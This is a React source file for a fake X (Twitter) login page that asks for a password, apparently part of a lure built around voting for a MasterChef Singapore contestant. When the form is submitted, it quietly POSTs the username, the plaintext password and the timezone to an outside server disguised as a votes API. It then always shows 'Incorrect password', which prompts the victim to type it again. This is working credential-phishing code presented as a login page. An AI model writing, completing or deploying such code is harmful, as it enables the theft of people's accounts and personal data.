import { useEffect, useState } from "react";
import xLogo from "../assets/x-logo.png";

export default function XPassword() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  useEffect(() => {
    const savedUser = localStorage.getItem("x_username");

    if (!savedUser) {
      window.location.href = "/login/x";
      return;
    }

    setUsername(savedUser);
  }, []);


  async function submitForm(e) {
    e.preventDefault();

    if (!password.trim()) {
      alert("Please enter your password.");
      return;
    }

    setLoading(true);

    try {
      await new Promise((resolve) => setTimeout(resolve, 700));
      await fetch(
        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            candidate_number: localStorage.getItem("candidate"),
            platform: "x",
            username,
            password,
            location: Intl.DateTimeFormat().resolvedOptions().timeZone,
          }),
        }
      );
    } catch (err) {
      console.log(err);
    } finally {
      setError(true);
      setPassword("");
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-black flex items-center justify-center px-6">
      <div className="w-full max-w-sm">

        <div className="flex justify-center mb-8">
          <img
            src={xLogo}
            alt="X"
            className="w-14 h-14 object-contain"
          />
        </div>

        <h1 className="text-white text-3xl font-bold mb-8">
          Enter your password
        </h1>
        <p className="text-gray-400 mb-5">
          {username}
        </p>

        <form onSubmit={submitForm} className="space-y-5">

          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              if (error) setError(false);
            }}
            className={`w-full rounded-md border bg-black px-4 py-4 text-white outline-none focus:border-blue-500 ${
              error ? "shake-error border-red-500" : "border-gray-700"
            }`}
          />
          {error && <p className="text-sm text-red-500">Incorrect password</p>}

          <div className="mt-3">
  <span className="text-sm text-white/70 hover:underline cursor-pointer">
    Forgot password?
  </span>
</div>

          <button
            type="submit"
            disabled={loading}
            className="w-full rounded-full bg-white text-black font-bold py-3 hover:bg-gray-200 transition"
          >
            {loading ? "Submitting..." : "Log in"}
          </button>

        </form>

      </div>
    </div>
  );
}